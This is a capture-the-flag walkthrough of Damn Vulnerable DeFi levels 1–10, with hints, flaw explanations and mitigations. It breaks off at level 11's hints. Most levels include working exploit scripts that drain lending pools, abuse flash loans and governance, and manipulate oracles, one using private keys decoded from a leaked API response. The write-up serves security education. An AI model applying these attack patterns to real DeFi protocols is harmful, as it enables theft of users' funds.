![](cover.png)
Created by [@tinchoabbate](https://twitter.com/tinchoabbate)
Visit [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz)

# Solutions - Walkthrough

When contracts are used to solve challenges, they can be found under each `contracts` folder named with the word **Cracker** (e.g. *"SelfieCracker"*).

# Index
- [1) Unstoppable](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#1-unstoppable)
- [2) Naive Receiver](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#2-naive-receiver)
- [3) Truster Lender Pool](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#3-truster-lender-pool)
- [4) Side Entrance](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#4-side-entrance-lender)
- [5) The Rewarder](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#5-the-rewarder)
- [6) Selfie](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#6-selfie)
- [7) Compromised](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#7-compromised)
- [8) Puppet](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#8-puppet)
- [9) Puppet V2](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#9-puppet-v2)
- [10) Free Rider](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#10-free-rider)
- [11) Backdoor](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#11-backdoor)
- [12) Climber](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#12-Climber)
⠀
⠀

## 1) Unstoppable

### Catch - Hints

The issue in here is considering that the only way to send funds to the `UnstoppableLender.sol` contract is by executing the `depositTokens` (with a structure composed by a `transferFrom` method). There are many ways to make transactions that involve ERC20 tokens. Going from regular transactions to more creative ways such as selfdestructing contracts or predestinating funds!

### Solution

The `flashLoan` function seems fair but for one line. On `line 40`, a local variable which state is updated on other function is vulnerable. We are speaking about `poolBalance`, the weak point of this contract. It is only updated when the pool receives _DVT's_ by calling the `depositTokens`function. What happens if we send _DTV's_ with a regular compliant ERC20 `transfer`method? Or if we create a contract, deposit the _DVT's_ and selfdestruct the contract towards the `UnstoppableLender.sol` contract? Exactly, the `balanceOf(DVT's)` inside the lending pool will be increased and this change won't be tracked by the poorly implemented `poolBalance` state.

By implementing this code on the `Exploit` part of the test, this level will be solved.

    this.token.connect(attacker).transfer(this.pool.address, 1);

### Learnings - Mitigations

- If we are checking a strict equality or inequality, analyze from where, who and when can manipulate each parts of the equation and evaluate if the malicious outcomes can be triggered.
- This also is very common with `require` statements that are bypassed by tricking using a little bit of math and blockchain knowledge and also to unexpectedly enter `if` statements executions.
- For equalities and inequalities, it is also advisable to think about feasible cases. For example, is it possible for a user to send a transaction with an amount greater than the current supply of Ether? But... is that possible for a 50% of supply? And 10%? What if the token in question is not Ether? All this border scenarios help understanding feasible cases!

**Think outside the box before exploiters do!**
⠀
⠀
⠀

## 2) Naive Receiver

### Catch - Hints

This is an access control problem! What happens if I could go to the bank and borrow money on your behalf...? Also if it helps other approach can be, thinking about when it is convenient to define a variable as an absolute value and when it is more suitable to use relative values.

### Solution

The vulnerable point of this scheme is located at the function `receiveEther()` in the contract `FlashLoanReceiver.sol`. It is important not only to check that the lending is coming from the desired pool but also checking that the trigger for the loan is done by the owner of the receiver contract. This is exploitable by asking for tokens to other borrower, on this case if we (as attackers) ask the pool for tokens to the receiver, because of the fee the balance on the latter will be drained (on this case after ten successful transactions).
To execute this exploit running a simple script will do the job:

    let amountToLoan = ethers.utils.parseEther("0"); // This value can be anything (even zero) because the loan is effectively returned.
    let fixedFee = await this.pool.fixedFee();
    while ((await ethers.provider.getBalance(this.receiver.address)).gte(fixedFee)) {
        await this.pool.connect(attacker).flashLoan(this.receiver.address, amountToLoan);
    }

### Learnings - Mitigations

- We need to track that the one who triggers the loan is the `owner` of the contract! Because we cannot control the code of the Lending Borrowing pool, we can only manage our own code. Sometimes the lending function of the pool passes the `msg.sender` as parameter that can be checked as an initiator within the security checks on the beginning of `receiveEther()` function. It can look something like this example, that uses the `Ownable` modifier:

        function triggerLoan(uint256 _amount) public onlyOwner{
            // Here is where the flash loan is asked
            lender.flashLoan(IERC3156FlashBorrower(this), _amount);
        }

        function onFlashLoan(
            address initiator,
            address token,
            uint256 amount,
            uint256,
            bytes calldata data
            ) external override returns (bytes32){
                require(msg.sender == address(lender), "Not lending from the desired pool");
                require(initiator  == address(this), "Flashloan not requested by this contract");

                // Loan logic.


                // Finish Loan Logic - return the loan otherwise will fail
                return keccak256("ERC3156FlashBorrower.onFlashLoan");
            }

- We have to be extremely careful about the access control of each feature that involves funds.

**Next time remember... when you lend money to a friend, never expect it back!**
⠀
⠀
⠀

## 3) Truster Lender Pool

### Catch - Hints

The best advice to solve this level is thinking about the word _trust_. Lets go back to the 90's. Would you give a blank check to Jordan Belfort? This level does the same. It is giving us a blank check...

### Solution

The vulnerability in here is on the `line 36` of the contract. The pool is giving us the chance to pick different actors as for `borrower` and `target`. Also, the weakness is that by letting us input the `calldata` we can use it to exploit the pool by relying on one function of the `ERC20` standard. The exploit can be performed into two different ways. Performing one transaction and two. We will showcase the shorter version and explain how to do the other one.

Using the _blank check_ that this contract gives us it is quite simple. We need to trigger the `flashLoan` function and pass it as `calldata` an instruction that let us transfer the tokens held on the `TrusterLenderPool`. There is one function that let us do this only when a crucial requirement is fulfilled: the `approval`. We will encode the `approval` call into the `calldata`. The key in here is that this call is coming from the pool contract and thus will be valid (because technically, you can only approve the tokens held by you, otherwise this will be a mess...), in other words the call will be done by the `msg.sender == address(pool)`. This will let either the `attacker` or the `TrustCracker.sol` contract to execute afterwards the ERC20 `transferFrom` function and drain the pool.

The basic structure to do so will be a function like this one (for interfaces initialization and how the contract should be deployed, you can check the `TrustCracker.sol`
contract under the `contracts` folder):

    function drainPool() public {
        uint256 poolBalance = token.balanceOf(address(pool));

        /* Beware with the function string under the encoder, if there are any spaces after the commas
        the call will fail!
        */
        bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        pool.flashLoan(0, attacker, address(token), payload);
        token.transferFrom(address(pool), attacker, poolBalance);
    }

This would be the shorter solution. To understand how this could be performed in a single txn lets see how flashloans are executed.

1. A receiver contract containing the ```receive``` function with the required structure by the pool, calls for the ```flashLoan```
2. Once the tokens arrive to the receiver, internal and desired transactions are performed (e.g. arbitrage).
3. When the internal transactions are finished, the receiver contract **must** send the tokens back to the pool.

The exploit can be done in a single transaction because the ```flashLoan``` function does not checks that the requested amount is **greater than zero**, this makes the _step 3_ not required (because if I don't ask for tokens, I am not obliged to return anything!).

The same exploit can be done while requesting tokens (more than zero), executing the ```approval``` for the pool balance, returning back the requested amount and in a former transaction call the ```transferFrom``` method and drain the `TrusterLenderPool`.

### Learnings - Mitigations

- Respecting the ```flashloan``` basic contract structure is a must.
- If the pool is only lending with the ```loan``` function, check that the requested amount is greater than zero. _Go elsewhere to ask for zero tokenz, we ar a sekur protokol pal._
- Give a fixed calldata structure inside the ```loan``` function to prevent malicious calls. Do not request it as a parameter.
- To rely on logic, tokens can only be borrowed by contracts. Individual wallets cannot perform further logic such as contracts do.

**And remember, if a suited guy flexing cars and watches comes by offering huge APY's, run away. It is a scheme.**
⠀
⠀
⠀

## 4) Side Entrance Lender

### Catch - Hints

We need to look closely how does the balance of this contract is modified. Think this contract as a big water tank with two inlets of water and castor oil (density near waters) and two outlets that checks its level. It is basically saying... "if my level is constant, the mixture inside is constant". What if we decide to turn of the water inlet and fill it back with oil (keeping the outlets open). The level will remain constant but... there will no more water inside the tank! This level can be cracked by thinking how things remain constant and how they may change...

### Solution

We may trick the contract with the `deposit` and `withdraw` logic combined with the request for a `flashLoan`. If we follow this path we will be able to empty the contract:

1. Ask for a loan for its whole balance.
2. When the ```execute``` function is triggered, we can give the ethers back by calling ```deposit```. This will make the pool balance to match the ```require``` condition and the ```flashLoan``` function will be mined completely. Also, this assigns the ```SideCracker``` contract a balance inside the `balances``` mapping stored on the pool contract. In other words, we returned back the tokens but we assigned them as our property as for the pool logic.
3. Because we now hold a balance as our property, we can simply call the ```withdraw``` function and draining the pool!

The contract that exploits this pool is within the same folder as the contract of this level but the logic will be something like this:

    receive() external payable {}

    function drainPool() public {  
        callFlashLoan(); // ---> Step 1: Triggering the loan

        pool.withdraw(); ---> Step 4: Rekt
        payable(attacker).transfer(address(this).balance); // ---> Step 5: Rekt V2
    }

    function callFlashLoan() public { ---> Step 1
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
    }

    function execute() external payable { // ---> Step 2: Receiving the funds
        pool.deposit{value: msg.value}(); // ---> Step 3: "Paying" the loan back
    }

Call `drainPool` and **kboom**!

### Learnings - Mitigations

- Be always wary about side entrance functions that may change the checked condition making a kind of illusionism show.
- The fact that some variables remain the same after a call it is not a sign that the new state is exactly the same.

**Always look after your drink while at a bar!**
  ⠀
  ⠀

## 5) The rewarder

### Catch - Hints

Think about how does a boundary case affects a value. On math, this is a border case that can be analyzed with tendency and limit algebra. 

To be more clear, what happens if there is a company that has 10,000 shares on the market and it gives dividends according the % owned of the company?

 You own 5,000 shares. So, you will be receiving a 50% of the dividends. Somehow, you manage to buy more and now you have 9,000. This means that you will be owner of the 90% of the dividends. You keep buying more and more and you finish with 9,999 shares and the founder of the company is very reluctant to sell that remaining share. You now are the owner of the 99.99% of the dividends but because of the founder, you will **never** be the owner of the 100%.

This is a border case. That 0.001% makes no difference but you won't receive all the dividends. If you can apply this logic somehow with this scenario with the given tools, you will pass this level.

**Tip:** Dividends are not paid daily, some time needs to pass!

### Solution

The same physics logic can be applied in here. The state of the rewards is refreshed at a fixed timespan. It is analogue to say that we are deducting a physic property is constant just by measuring it on two different times. This is sometimes true, but everything depends on how long is the timespan of measurements. A flowrate, for example, may change and saying that it remained constant all the year long only by measuring the flowrate once per year is a faulty assertion!

The weakness of this contract relies on having fixed times to update the reward amounts. We can exploit it with this logic.

1) Wait until the next rewards calculation time (```5 days```).
2) Ask for a huge amount of tokens with a ```flashLoan```.
3) Use those borrowed tokens to harvest the rewards by calling ```deposit```. This will "exchange" our ```liquidity``` tokens for ```accounting``` ones. Because the ```amountBorrowed >>>> totalDepositsBefore```, the boundary limit by tendency will assign us a really big amount of tokens (more than the 99% of them).
4) To return the loan (made in ```liquidity``` tokens), we can call the ```withdraw```function that burns the ```accounting``` tokens and gives us back the ```liquidity``` ones.
5) Transfer the ```rewardTokens``` from the contract right to the ```attacker``` (us) and that's it!

The functions behind this logic:

    // Function required by the structure of the flashLoan.
    function receiveFlashLoan(uint256 amount) external {
        rewarderPool.deposit(amount); // Generates the rewards.
        rewarderPool.withdraw(amount); // Burns the accToken getting liquidity back. 
        liquidityToken.transfer(address(flashLoan), amount);// Paying the loan back.
    }

    function stealRewards() public {
        uint256 maxLoan = liquidityToken.balanceOf(address(flashLoan));
        
        liquidityToken.approve(address(rewarderPool), maxLoan); // Allow the rewards pool to take our tokens.
        flashLoan.flashLoan(maxLoan); // From here, this contract will be in possession of the rewards.
        
        // Transfer the rewards to the attacker. The transfer function return is checked on-execution.
        require(rewardToken.transfer(attacker, rewardToken.balanceOf(address(this))));
    }

### Learnings - Mitigations
- Prevent depending on fixed timeframes where the rewards are updated. In other words, having a logic that relies on a single point of time instead of having a continuous updates of the data the rewards allocation can be manipulated by a flash loans.
- Thinking about border scenarios regarding fractions is useful to come up with border situations that may break that math and other logic dependant steps.

**Pizza is knowledge! Never leave the crust (borders) unattended!**  ⠀
  ⠀
  ⠀

## 6) Selfie

### Catch - Hints
The title of this challenge is a huge hint on what we need to do to solve it! Somehow, we need to conduct a totalitarian decision within the governance... the message in here is clear. Totalitarian governments are vulnerable.

### Solution
If you look closer on how the level contracts are deployed, you will see that both the ```flashLoan``` tokens and the ```governance``` tokens are technically driven by the same ERC20 address. So... we can simply take a flashloan, push any action we want and then return those tokens back to the lending pool. The solution is a contract under the level ```contracts``` folder. The idea behind the solution is the following:

1) Ask for a huge loan composed by the ```tokens == governanceTokens```.
2) Snapshot that amount held in order to pass the snapshot check.
3) Queue any action we want to the Governance. On this case, it will be targeting the ```drainAllFunds``` from the pool.
4) Return the loan.
5) Wait until the cooldown time passes.
6) Execute the function within the execution queue of the Governance.

### Learnings - Mitigations
- Avoid having a flashLoanable governance token...

**Once you upload a photo, it will be always on the internet!**
  ⠀
  ⠀

## 7) Compromised

### Catch - Hints
First go to the Damn Vulnerable DeFi website and enter this challenge page. You will see a response of an API. Try to do something with that...

### Solution
Essentially, we need somehow to change the NFT price by manipulating the oracle. What we need to do is quite straightforward once we figure out what's encoded API response data. If we look closer, we see that there are two lines of information. Supposing that each line is a single response, we have:

    4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

    And the second set of information will be:

    4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

If we convert each dataset into a text from hex, we get the following values:

    MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
    MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4

And afterwards, by decoding that string chain as a base64:
    
    0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
    0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48

Hmmm, now they look familiar... They are indeed private keys! By running the following script we may determine their public key pair.

        const privateKeys = ["0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"];
        const publicKeys = privateKeys.map(hexValues =>{return ethers.utils.computeAddress(hexValues)});
        console.log(" ");
        console.log(`The leaked addresses are: ${publicKeys}`);
        console.log(" ");
        // Public Key 1: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
        // Public Key 2: 0x81A5D6E50C214044bE44cA0CB057fe119097850c

As we may see, those public keys are two out of the three "trusted" price sources of the oracle.
The Oracle contract allows each trusted address to change the NFT price. So, why do we need two out of three sources? Why having just one is not enough?

Looking closer how the oracle calculates the price, it gives the median price as a return when the price is queried. This median price is calculated as the price of the source that's on the "middle" of the price array. If there are even amount of sources, it calculates an average of the two middle prices.

All of this won't be achievable if the prices are disordered. That's why before performing the ```_computedMedianPrice``` the prices are sorted. If we only change the price of the "middle" source, the contract sorts the prices in an ascending way and that price won't be taken into account. That's why we will need to change both source prices.

By having access to the private keys, we are able to recover them and perform actions as if we where them. From now, everything is quite easy. The attacking process will be:

1) Changing both source prices to an affordable price for the attacker, pretending to be each source wallet.
2) Buy the NFT as the attacker.
3) Get the current exchange balance (because our purchase increased it).
4) Change the NFT price again like the step 1) but setting the price as the current exchange balance.
5) Approve the Exchange for the recently minted NFT and then sell it.
6) Set the NFT price back to its initial value.

This process can be done with this script:

        const privateKeys = ["0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"];
        const publicKeys = privateKeys.map(hexValues =>{return ethers.utils.computeAddress(hexValues)});
        console.log(" ");
        console.log(`The leaked addresses are: ${publicKeys}`);
        console.log(" ");
        
        // The following line creates the Wallet instances to connect them as signers.
        let sourceWallets = privateKeys.map(keys => {return new ethers.Wallet(keys, ethers.provider)}) ;

        // Helper function that loops over all the addresses making the calls to the Oracle contract.
        const manipulatePrice = async (newPrice) => {
            for (const wallet of sourceWallets){
                let etherBalance = ethers.utils.formatEther(await ethers.provider.getBalance(wallet.address));
                console.log(" ");
                console.log("=======================================")
                console.log(`Acting as wallet ${wallet.address}. It has a balance of ${etherBalance} ETH` );
                console.log(`Changing DVNFT price to ${newPrice} ETH....`);
                let parsedPrice = ethers.utils.parseEther(newPrice);
                await this.oracle.connect(wallet).postPrice("DVNFT", parsedPrice);

                expect(
                    ethers.utils.formatEther(await this.oracle.getPriceBySource("DVNFT", wallet.address))
                    ).to.equal(
                        ethers.utils.formatEther(parsedPrice));
                console.log("The price has been changed successfully.");
                console.log(" ");
            }
            let oracleNFTPrice = ethers.utils.formatEther(await this.oracle.connect(attacker).getMedianPrice("DVNFT"));
            console.log(`The computed price by the oracle is now ${oracleNFTPrice} ETH`);
            console.log(" ");
        }

        let newPrice = "0.05"
        await manipulatePrice(newPrice);
        
        // Minting One token.    
        const gasEstimate = await this.exchange.estimateGas.buyOne({value: ethers.utils.parseEther("0.1")});
        let mintedTokenID = await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther(newPrice), gasLimit: gasEstimate });
        let attackerBalance = (await this.nftToken.balanceOf(attacker.address));
        expect(attackerBalance).to.equal(1);
        console.log(await this.nftToken.ownerOf(0))
        console.log("=======================================");
        console.log(`Successfully minted a token @ ${newPrice} ETH. The attacker now has ${attackerBalance} NFTs`);
        console.log("=======================================");

        // Getting the current exchange balance in order to drain it.
        let currentExchangeBalance = ethers.utils.formatEther(await ethers.provider.getBalance(this.exchange.address));
        console.log(`The exchange currently has a balance of ${currentExchangeBalance} ETH.`)
        
        // Setting up the price as the amount to drain.
        await manipulatePrice(currentExchangeBalance);

        // Starting the draining process.
        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
        // console.log(await this.nftToken.ownerOf(0)); // ===> Check that the first token has 0 as index.
        await this.exchange.connect(attacker).sellOne(0);

        // Placing the NFT price back to its older price.
        await manipulatePrice("999");
⠀
⠀


**Bonus Track**

This level leaves a bonus track that can be done as an easter egg! It does not checks the final balance of each source... but we can also drain them by calling the following script!

        // BONUS. We can also drain each source address!
        const drainSources = async () => {
            for(const wallet of sourceWallets){

                let walletBalance = await ethers.provider.getBalance(wallet.address)
                await wallet.sendTransaction({to: attacker.address, value: walletBalance})
                walletBalance = await ethers.provider.getBalance(wallet.address)
                expect(walletBalance).to.equal(0);
            }
            console.log("Successfully drained each source!")
        }
        await drainSources();

### Learnings - Mitigations
- The main vulnerability in here is the Web2-side of the project. While using sensible data, it is advised to use one way encoded formats of that data in order to prevent this scenarios.
- Knowing how and what information is available to be queried from our server also helps.

**The contracts are not always the weak point!**
  ⠀
  ⠀

## 8) Puppet

### Catch - Hints
By taking into account the concept of offer and demand as well as knowing how does Solidity manages "decimal" numbers, this level is solved.

### Solution
The main vulnerability in here is relying on a single oracle as a source to calculate the required amount of collateral. Also, the math within the contract makes the attack even easier.

This level relies on the ```_computeOraclePrice()``` function in order to perform the estimation of the collateral needed to request a certain amount of tokens. If you are coming from languages such as Python or Javascript you won't see anything odd in here. But in Solidity, things work quite different in terms of numbers. 

The mentioned function performs a division of two terms (both having 18 *decimals*). To illustrate this, we may follow this example:
⠀
⠀

| Python | 0.15  | 0.99 | 1 | 250 |
| :---:   | :-: | :-: | :-: | :-: |
| Solidity | 15 | 99 | 100 | 25,000 |


In the recent example we see that in order to express decimals on Solidity, we must express them as integers with a certain *sensibility*. And afterwards when we want to perform an operation with the real number, we need to know the amount of decimal positions that the number has in order to add or remove them.

So, what happens if we perform a division like this one ```2/10```? The result won't be ```0.2``` as expected. It will be shown as ```0``` because no decimal positions are natively defined on Solidity!

Although this level uses a ```0.8.0``` compiler that comes with built-in over and underflow checks, this vulnerability exists because the scenario explained before can happen without throwing an over or underflow error! What we need to do is imbalance the division by making the denominator slightly bigger than the numerator and poof. That expression will go down drastically!

To do so, we can use the Uniswap DEX instance of this level to swap the DVT tokens for a small amount of ether. The swaps are also known as AMM (automated market makers). Short story, they perform realtime math and finance calculations to estimate the equilibrium price of a certain swap based on the current demand and offer of the token as well as the current *ratio*. In here, the current balance says that the price is ```1 DVT = 1 ETH``` because there are 10 of each. But... what happens if we dump the price by offering ```1000 DVT = 1 wei``` ?(whoa, what an offer). Exactly, there will be a new price! But even more important, there will be a big imbalance on the Uniswap pool for the pair ```ETH / DVT``` causing the ```_computeOraclePrice()``` to return what we need!

The steps to perform this exploit are the following:

1) Approve the DEX and swap ```999 DVT``` for ```1 wei``` (*)
2) Get the collateral required to extract the current total balance of DVT tokens from the Pool.
3) Borrow all the tokens of the pool paying the collateral required.

(*) You can try lowering this amount of given tokens to the swap in order to have as a result a collateral required of something near 25 ETH. But for simplicity, we used that number (because the level checks that the final DVT balance must be greater than the original pool balance).

The code for this exploit may look something like this:

        let smallAmount = ethers.utils.parseEther("999");

        await this.token.connect(attacker).approve(
            this.uniswapExchange.address,
            smallAmount
        );
        
        let uniswapPairEthBalance = await ethers.provider.getBalance(this.uniswapExchange.address);
        let uniswapTokenBalance   = await this.token.balanceOf(this.uniswapExchange.address);
        let computedPrice = uniswapPairEthBalance.mul(ethers.BigNumber.from(10).pow(18)).div(uniswapTokenBalance);
        console.log(`Computed Oracle Price before swap: ${ethers.utils.formatEther(computedPrice)}`);

        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
            smallAmount,                                                // tokens sold
            1,                                                          // min_eth_in_wei
            (await ethers.provider.getBlock('latest')).timestamp * 3    // deadline
        );

        uniswapPairEthBalance = await ethers.provider.getBalance(this.uniswapExchange.address);
        uniswapTokenBalance   = await this.token.balanceOf(this.uniswapExchange.address);
        computedPrice = uniswapPairEthBalance.mul(ethers.BigNumber.from(10).pow(18)).div(uniswapTokenBalance);
        console.log(`Computed Oracle Price after swap:  ${ethers.utils.formatEther(computedPrice)}`);
        
        let collateralRequired =  await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log(`Collateral required to withdraw all funds: ${ethers.utils.formatEther(collateralRequired)}`);
        
        let lendingPoolBalance = await this.token.balanceOf(this.lendingPool.address);
        await this.lendingPool.connect(attacker).borrow(lendingPoolBalance, {value: collateralRequired});
        console.log(" ");

### Learnings - Mitigations
- When needing to use external sources of price or information, never rely on a single oracle source. If there is no other way to do so, use trusted oracles such as Chainlink for example.
- When performing divisions, we need to evaluate if the denominator can be in a scenario greater than the numerator and how it may impact the contract logic.
- If we need to perform a division to use that ratio as a proportional for other number, it is advisable to perform all the multiplications first and then calculate the division in the end. On this level this could be done by combining the functions ```calculateDepositRequired``` and ```_computeOraclePrice``` in a single operation that first multiplies the ```amount``` with ```uniswapPair.balance``` performing the division by ```token.balanceOf(uniswapPair)``` in the end.
- Doing the former suggestion does not stops anyone from going to the DEX and perform swaps in order to manipulate the price. It is a matter of liquidity also! If the token has more liquidity, it is harder to manipulate it.

**Remember when on school we where taught to do "boxed divisions"? Solidity also hates the remainder!**
  ⠀
  ⠀

## 9) Puppet V2

### Catch - Hints
You need to apply the same logic from the last level in here. Precisely, think about the end quote of the **Puppet** level.

### Solution
This contract amends the multiplication and division and performs it in a single step but it does not patch the strong dependance on a single oracle. The fact of relying on a single oracle price (Uniswap), allows an attacker to twist the balance on its favor achieving any rate of collateral of his desire.

The steps to drain all the DVT tokens from the pool are the following:

1) Increase the ```DVT``` balance on Uniswap by exchanging them for ```ETH``` (which also increases our ```ETH``` balance).
2) Getting ```WETH``` by wrapping ```ETH``` within the ```WETH``` contract.
3) Borrowing all the ```DVT``` tokens held on the Lending Pool.

The script would be something like this:

        // Estimating the initial amount of collateral needed to borrow.
        let oneDVT = ethers.utils.parseEther("1");
        let collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(oneDVT);
        console.log(`In order to borrow 1 DVT, it is needed ${ethers.utils.formatEther(collateralRequired)} WETH`);

        // We need to drain the WETH or increase the DVT on the UniswapV2 pool in order to get DVT >>>> WETH.
        let amountToLiquidate = ethers.utils.parseEther("10000");
        let askedAmountOfETH = ethers.utils.parseEther("8");
        let txPath = [this.token.address, this.weth.address];

        await this.token.connect(attacker).approve(this.uniswapRouter.address, amountToLiquidate);
        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
            amountToLiquidate,                                           // amountOut
            askedAmountOfETH,                                          // amountInMax
            txPath,                                                     // path
            attacker.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2    // deadline
        );
        console.log(`Swapped ${ethers.utils.formatEther(amountToLiquidate)} DVT for ${ethers.utils.formatEther(askedAmountOfETH)}`)
        
        let attackerEthBalance = await ethers.provider.getBalance(attacker.address);
        let attackerDVTBalance = await this.token.balanceOf(attacker.address);

        let uniswapEthBalance = await ethers.provider.getBalance(this.uniswapExchange.address);
        let uniswapDVTBalance = await this.token.balanceOf(this.uniswapExchange.address);

        console.log(" ");
        console.log("========== ========== ==========");
        console.log(`Attacker Balances:`);
        console.log(`${ethers.utils.formatEther(attackerEthBalance)} ETH`);
        console.log(`${ethers.utils.formatEther(attackerDVTBalance)} DVTs`);
        console.log("========== ========== ==========")
        console.log(" ");
        console.log("========== ========== ==========");
        console.log(`Uniswap Balances:`);
        console.log(`${ethers.utils.formatEther(uniswapEthBalance)} ETH`);
        console.log(`${ethers.utils.formatEther(uniswapDVTBalance)} DVTs`);
        console.log("========== ========== ==========")
        console.log(" ");
        
        // Swapping the new ether amount for WETH (minus a small amount to cover gas costs).
        this.weth.connect(attacker).deposit({value: (await ethers.provider.getBalance(attacker.address)).mul(997).div(1000)});
        let attackerWethBalance = await this.weth.balanceOf(attacker.address);
        console.log(`The attacker now has ${ethers.utils.formatEther(attackerWethBalance)} WETH`);

        // Calculating the collateral for the new token status.
        collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(oneDVT);
        console.log(`In order to borrow 1 DVT, it is needed ${ethers.utils.formatEther(collateralRequired)} WETH`);
        
        let currentPoolBalance = await this.token.balanceOf(this.lendingPool.address);
        collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(currentPoolBalance);
        console.log(`If we get greedy, to drain the pool we need ${ethers.utils.formatEther(collateralRequired)} WETH`);
        console.log(" ");

        // Now, we can drain the pool
        let amountToBorrow = await this.token.balanceOf(this.lendingPool.address);
        collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(amountToBorrow);
        console.log(`In order to borrow ${ethers.utils.formatEther(amountToBorrow)} DVT, it is needed ${ethers.utils.formatEther(collateralRequired)} WETH`);
        await this.weth.connect(attacker).approve(this.lendingPool.address, amountToBorrow.mul(101).div(100)); // Allowing 1% more as a sec. coef.
        await this.lendingPool.connect(attacker).borrow(amountToBorrow);

        attackerWethBalance = await this.weth.balanceOf(attacker.address);
        attackerDVTBalance = await this.token.balanceOf(attacker.address);

        console.log(" ");
        console.log("========== ========== ==========");
        console.log(`Attacker Balances:`);
        console.log(`${ethers.utils.formatEther(attackerWethBalance)} WETH`);
        console.log(`${ethers.utils.formatEther(attackerDVTBalance)} DVTs`);
        console.log("========== ========== ==========")
        console.log(" ");   

And that's it! Another pool drained!

### Learnings - Mitigations
- Same as before, prevent relying on a single oracle unless there is no other way! 

**Why are we draining everything? Is there a flood?**
⠀
⠀
⠀

## 10) Free Rider

### Catch - Hints
The order, matters. That's all we are going to say.


### Solution
This level has two main teachings. The first one is learning how to perform flashloans from the Uniswap pool and the second one is understanding that the order really matters.
The main vulnerability on this level resides on the set of lines ```77``` and ```80``` of the ```FreeRiderNFTMarketplace``` contract. This marketplace first performs the NFT transfer and then sends the payment to the owner. The problem in here is that they transfer the NFT before making the payment. It's a matter of ownership, that changes like so:

*The Poor Alice has an NFT listed on the FreeRiderNFTMarketplace. John decides to gather 15 ETH and purchase the NFT. The contract will do the following process. First, transfer the NFT to John, so now the owner of the NFT is indeed John. Then, it will assign the NFT to the new owner and then will pay to that owner. The problem is that the owner is now... John! The contract is damn vulnerable!*

The other challenge of this contract is understanding how flashloans work. But, why do we need a flashloan anyways? Well, lets take a look to the solution approach (remember that the attacker starts with 0.5 ETH).

1) The attacker requests a flashloan by flashwapping ```15 WETH``` from Uniswap.
2) Unwraps the ```WETH``` into ```ETH```.
3) Buys all the NFTs with only ```15 ETH```(instead of the ```90 ETH``` meant).
4) Transfers all the NFTs to the buyer and claims the ```45 ETH``` reward.
5) Pays back the loan.

If there was an ```ETH``` flashloan available the process will be the same by starting from step 2) with the asked ETH.

Uniswap has the chance to request flashswaps. They are like flashloans to a certain pair of tokens. So, you will only have available the balance of tokens of a certain pair (on this level ```DVT/WETH```). The idea is that every swap will work as spot swap if no ```data``` is passed (requiring the swapper to give the counterpart of requested tokens). If we pass some ```data```, the DEX will interpret that we are willing to perform a flashswap and will trigger the callback ```uniswapV2Call``` within the requester contract. It is extremely important to check not only that the pair exists (flashloaner) but also that the requester was indeed the desired contract to prevent malicious external calls. 

Inside the callback function we can retrieve the passed ```data``` from before and also do whatever we want with the flashloaned amount. After we finished performing the desired transactions we must pay the loan back plus a fee. 

The solution is a contract and it can be found within the level folder.

### Learnings - Mitigations
- Being extremely careful with the order of the transfers and payments is a must. We have to ensure that the transfer of ownership and tokens will be in the desired order and that they won't overlap between each other.

**Both for Smart Contracts and Food Delivery... the order really matters!**
⠀
⠀
⠀

## 11) Backdoor

### Catch - Hints
Oof. This is a tough one. The best way to approach this is reverse-engineering the call process. To start thinking about this, it might be helpful to observe the `proxyCreated` function without reading its logic. Go straight up to its nature. When and how can this function be called? By who? 
